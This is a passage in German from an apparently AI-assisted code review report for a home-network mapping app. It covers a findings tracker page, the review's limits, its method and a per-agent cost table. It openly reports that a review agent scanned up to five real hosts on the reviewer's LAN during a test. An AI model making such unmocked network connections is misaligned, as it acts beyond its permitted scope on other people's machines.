          <option value="">alle</option>
        </select></label
      >
      <label>Suche <input id="f-text" type="search" /></label>
    </div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>ID</th>
            <th>Punkt</th>
            <th>Welle</th>
            <th>Schwere</th>
            <th>Status</th>
            <th>Nachweis</th>
            <th>Commit</th>
          </tr>
        </thead>
        <tbody id="rows"></tbody>
      </table>
    </div>

    <script id="daten" type="application/json">
      {
        "stand": "TT.MM.JJJJ, Commit abcdef0",
        "wellen": [{ "id": "W0", "titel": "Werkzeuge und Gate" }],
        "punkte": [
          {
            "id": "S-1",
            "titel": "Embed-Link zeigt nur Geräte im erlaubten Bereich",
            "welle": "W2",
            "schwere": "hoch",
            "status": "offen",
            "nachweis": "",
            "commit": "",
            "notiz": ""
          }
        ]
      }
    </script>
    <script>
      const D = JSON.parse(document.getElementById("daten").textContent);
      const ST = [
        "offen",
        "in_arbeit",
        "review",
        "blockiert",
        "erledigt",
        "verworfen",
      ];
      const SV = ["kritisch", "hoch", "mittel", "niedrig"];
      const el = (t, c, x) => {
        const e = document.createElement(t);
        if (c) e.className = c;
        if (x != null) e.textContent = x;
        return e;
      };
      document.getElementById("meta").textContent =
        "Stand: " +
        D.stand +
        " · " +
        D.punkte.length +
        " Punkte · " +
        D.punkte.filter((p) => p.status === "erledigt").length +
        " erledigt";
      const bars = document.getElementById("bars");
      for (const w of D.wellen) {
        const ps = D.punkte.filter(
          (p) => p.welle === w.id && p.status !== "verworfen",
        );
        const done = ps.filter((p) => p.status === "erledigt").length;
        const pct = ps.length ? Math.round((100 * done) / ps.length) : 0;
        const b = el("div", "bar");
        b.append(el("span", "", w.id + " " + w.titel));
        const tr = el("div", "track");
        const f = el("div", "fill");
        f.style.width = pct + "%";
        tr.append(f);
        b.append(tr, el("span", "mut", done + "/" + ps.length));
        bars.append(b);
      }
      const fill = (id, vals) => {
        const s = document.getElementById(id);
        for (const v of vals) s.append(new Option(v, v));
      };
      fill(
        "f-welle",
        D.wellen.map((w) => w.id),
      );
      fill("f-status", ST);
      fill("f-schwere", SV);
      function render() {
        const fw = document.getElementById("f-welle").value,
          fs = document.getElementById("f-status").value,
          fv = document.getElementById("f-schwere").value,
          ft = document.getElementById("f-text").value.toLowerCase();
        const body = document.getElementById("rows");
        body.replaceChildren();
        for (const p of D.punkte) {
          if (
            (fw && p.welle !== fw) ||
            (fs && p.status !== fs) ||
            (fv && p.schwere !== fv)
          )
            continue;
          if (
            ft &&
            !(p.id + " " + p.titel + " " + p.notiz).toLowerCase().includes(ft)
          )
            continue;
          const r = el("tr");
          r.append(el("td", "", p.id));
          const t = el("td", "", p.titel);
          if (p.notiz) {
            t.append(el("br"));
            t.append(el("span", "mut", p.notiz));
          }
          r.append(t);
          r.append(
            el("td", "", p.welle),
            el("td", "sev-" + p.schwere, p.schwere),
          );
          const s = el("td");
          s.append(el("span", "tag s-" + p.status, p.status.replace("_", " ")));
          r.append(s);
          r.append(el("td", "", p.nachweis));
          const c = el("td");
          c.append(el("code", "", p.commit));
          r.append(c);
          body.append(r);
        }
      }
      for (const id of ["f-welle", "f-status", "f-schwere", "f-text"])
        document.getElementById(id).addEventListener("input", render);
      render();
    </script>
  </body>
</html>
```

## 11. Grenzen dieses Reviews

**Kein Befund beruht auf einem echten Netz, einem echten Browser oder einem laufenden Container.** Alles
andere wurde am Code nachgestellt oder aus dem Code belegt.

**Nicht geprüft**

- **Container:** Docker lief nicht. Die Härtung (UID, Capabilities, schreibgeschütztes Dateisystem) ist aus Dockerfile, Entrypoint und CI-Job belegt, nicht ausgeführt.
- **Browser:** Oberflächenbefunde stammen aus jsdom mit einer Cytoscape-Attrappe. Layout, Druckvorschau, Mobilansicht und echte Renderzeiten sind nicht gemessen.
- **Geräte:** keine echte FRITZ!Box, kein SNMP-Switch, kein mDNS im Netz. TR-064-, SNMP- und mDNS-Befunde beruhen auf präparierten Antworten an die Parser.
- **Speicher:** kein Docker Desktop mit virtiofs, kein NAS als Datenverzeichnis. Die SQLite-Fallbacks sind nur lokal geprüft.
- **Laufzeiten:** wie lange echte Scans die Schreibsperre halten, ist aus dem Code abgeschätzt (etwa 6 ms für 250 Geräte), nicht im Betrieb gemessen.

**Bewusst induktiv**

- **Schweregrade** richten sich nach der Einsatzannahme aus Abschnitt 3. Wer die Oberfläche direkt ins Internet stellt, muss die Sicherheitsbefunde höher einstufen.
- **Zeitplan im Gantt** beruht auf Erfahrungswerten mit Claude-Agenten. Für Mistral gibt es keine Messung.

**Vorfall während des Reviews**

- **Ein Prüfagent hat beim Nachstellen von SF-1 kurz echte TCP-Verbindungen zu bis zu fünf Hosts im lokalen Netz des Reviewers geöffnet**, weil der Port-Scan im Test nicht ersetzt war. Er brach ab und wiederholte den Versuch auf Testadressen. Für dein Repo und dein Netz hat das keine Folgen. Es zeigt aber, warum Abschnitt 9.1 echte Scans in Tests verbietet und Tests den Port-Scan immer ersetzen müssen.

## 12. Anhang A: Prüfmethode

**Jeder Befund ist von zwei unabhängigen Agenten bearbeitet worden: einer hat gesucht, ein anderer
hat versucht, ihn zu widerlegen.** Nur was die Gegenprüfung überstand, steht in Abschnitt 7.

1. **Basislinie:** gepinnte Abhängigkeiten in einer frischen Umgebung, dann `ruff`, `ruff format`, `pytest`, `mypy`, `pyright`, `pip-audit`, `npm audit`, jsdom-Check (Abschnitt 4).
2. **Suche in neun Winkeln, parallel und ohne Kenntnis voneinander:** Korrektheit des Backends, Sicherheit aus Angreifersicht, Nebenläufigkeit und Datenintegrität, stille Fehler, Testsuite, Typen und Lint, Codequalität und Architektur, Oberfläche, Doku und Abhängigkeiten.
3. **Gegenprüfung:** acht frische Agenten auf einem stärkeren Modell. Jeder hatte den Auftrag zu widerlegen, nicht zu bestätigen, und stellte jeden hohen und mittleren Befund mit eigenem Skript nach. Ergebnis: bestätigt, plausibel oder widerlegt, dazu die endgültige Schwere und Nebenwirkungen des Fixes.
4. **Mutationstest:** In einer Kopie des Repos wurden 46 gezielte Fehler einzeln eingebaut und die Suite je Fehler laufen gelassen. Die überlebenden Mutanten bilden die Kill-Liste für Welle 6.
5. **Zusammenführung:** Doppelte Befunde zusammengelegt, widerlegte in eine eigene Liste, die nicht erneut untersucht werden muss.

Die Sicherheitsprüfung lief gegen die App auf 127.0.0.1 mit `curl` und kleinen Angriffsskripten. Keine Anfrage ging an einen fremden Host.

## Anhang B: Aufwand dieses Reviews

**Analyse, Gegenprüfung und dieses Dokument haben rund 41 Millionen Token verbraucht, zu API-Listenpreisen etwa 24,52 USD.** Alles lief in einer einzigen Claude-Code-Sitzung. Gezählt sind die Hauptsitzung und jeder Unteragent, ausgelesen aus den Sitzungsprotokollen.

- **Preise** je Million Token, Stand November 2026: Claude Opus 5.5 4 USD Input, 20 USD Output, 0,20 USD Cache-Lesen; Claude Sonnet 5.5 2 USD, 10 USD, 0,10 USD. Cache-Schreiben kostet das 1,25-fache des Inputs bei 5 Minuten Lebensdauer, das Doppelte bei einer Stunde.
- **Input neu** sind Token, die das Modell erstmals gelesen hat: ungecachter Input plus Cache-Schreiben. **Cache gelesen** sind Token, die bei jedem weiteren Schritt erneut gelesen, aber zum Bruchteil berechnet werden. Sie machen den Großteil der Menge aus.
- **Effort** ist die eingestellte Denktiefe des Modells. **Komplexität** ist abgeleitet aus der Zahl der Werkzeugaufrufe: unter 20 niedrig, 20 bis 34 mittel, ab 35 hoch.
- **Nicht enthalten:** die letzten Schritte nach dieser Messung (Formatieren, Kopieren, Anschreiben), schätzungsweise unter 1 USD. Ein Abo-Tarif rechnet anders als die API; die Zahlen zeigen den Gegenwert.
- **Ebenfalls nicht enthalten:** die Umsetzung des Fixplans. Sie läuft auf Kais Mistral-Agenten.

| Rolle                                                                       | Modell            | Effort | Komplexität         | Turns   | Input neu   | Cache gelesen | Output    | USD       |
| --------------------------------------------------------------------------- | ----------------- | ------ | ------------------- | ------- | ----------- | ------------- | --------- | --------- |
| Orchestrierung: Planung, Basislinie, Briefs, Rückfragen, Dokument und Gantt | Claude Opus 5.5   | high   | hoch, 59 Aufrufe    | 46      | 275 k       | 8.112 k       | 95 k      | 5,72      |
| Suche: Korrektheit Backend                                                  | Claude Sonnet 5.5 | medium | mittel, 21 Aufrufe  | 21      | 123 k       | 1.532 k       | 20 k      | 0,66      |
| Suche: Nebenläufigkeit und Datenbank                                        | Claude Opus 5.5   | medium | mittel, 27 Aufrufe  | 24      | 124 k       | 2.115 k       | 30 k      | 1,64      |
| Suche: Doku, Abhängigkeiten, CI                                             | Claude Sonnet 5.5 | medium | niedrig, 13 Aufrufe | 11      | 64 k        | 502 k         | 13 k      | 0,34      |
| Suche: Oberfläche (jsdom)                                                   | Claude Sonnet 5.5 | medium | mittel, 27 Aufrufe  | 26      | 98 k        | 1.521 k       | 26 k      | 0,65      |
| Suche: Codequalität und Architektur                                         | Claude Sonnet 5.5 | medium | niedrig, 11 Aufrufe | 8       | 53 k        | 241 k         | 12 k      | 0,28      |
| Suche: Sicherheit, Angriffe live gegen 127.0.0.1                            | Claude Opus 5.5   | medium | hoch, 41 Aufrufe    | 41      | 134 k       | 3.807 k       | 38 k      | 2,19      |
| Suche: stille Fehler                                                        | Claude Sonnet 5.5 | medium | niedrig, 16 Aufrufe | 13      | 65 k        | 562 k         | 10 k      | 0,32      |
| Suche: Testsuite, Abdeckung, 46 Mutanten                                    | Claude Sonnet 5.5 | medium | mittel, 27 Aufrufe  | 26      | 87 k        | 1.383 k       | 22 k      | 0,58      |
| Suche: Typen und Lint                                                       | Claude Sonnet 5.5 | medium | niedrig, 15 Aufrufe | 14      | 51 k        | 466 k         | 11 k      | 0,29      |
| Gegenprüfung: Nebenläufigkeit                                               | Claude Opus 5.5   | medium | mittel, 23 Aufrufe  | 23      | 79 k        | 1.380 k       | 21 k      | 1,09      |
| Gegenprüfung: Korrektheit                                                   | Claude Opus 5.5   | medium | mittel, 23 Aufrufe  | 22      | 73 k        | 1.161 k       | 19 k      | 0,97      |
| Gegenprüfung: Doku und Abhängigkeiten                                       | Claude Opus 5.5   | medium | niedrig, 15 Aufrufe | 14      | 46 k        | 545 k         | 7 k       | 0,48      |
| Gegenprüfung: Oberfläche                                                    | Claude Opus 5.5   | medium | hoch, 37 Aufrufe    | 36      | 73 k        | 2.019 k       | 23 k      | 1,24      |
| Gegenprüfung: Sicherheit S-1 bis S-8                                        | Claude Opus 5.5   | medium | mittel, 25 Aufrufe  | 24      | 75 k        | 1.444 k       | 19 k      | 1,05      |
| Gegenprüfung: Sicherheit S-9 bis S-17                                       | Claude Opus 5.5   | medium | hoch, 40 Aufrufe    | 40      | 64 k        | 1.906 k       | 23 k      | 1,16      |
| Gegenprüfung: stille Fehler                                                 | Claude Opus 5.5   | medium | mittel, 28 Aufrufe  | 28      | 80 k        | 1.712 k       | 19 k      | 1,12      |
| Gegenprüfung: Tests, Mutanten, Qualität                                     | Claude Opus 5.5   | medium | hoch, 38 Aufrufe    | 37      | 78 k        | 2.103 k       | 20 k      | 1,21      |
| Zusammenführung: Befundkatalog, Wellen, Dateibesitz                         | Claude Sonnet 5.5 | high   | hoch, 45 Aufrufe    | 41      | 447 k       | 5.987 k       | 181 k     | 3,53      |
| **Summe**                                                                   |                   |        |                     | **495** | **2.089 k** | **38.498 k**  | **609 k** | **24,52** |

| Modell            | Agenten | Token gesamt | USD   |
| ----------------- | ------- | ------------ | ----- |
| Claude Opus 5.5   | 11      | 27,7 Mio.    | 17,87 |
| Claude Sonnet 5.5 | 8       | 13,5 Mio.    | 6,64  |
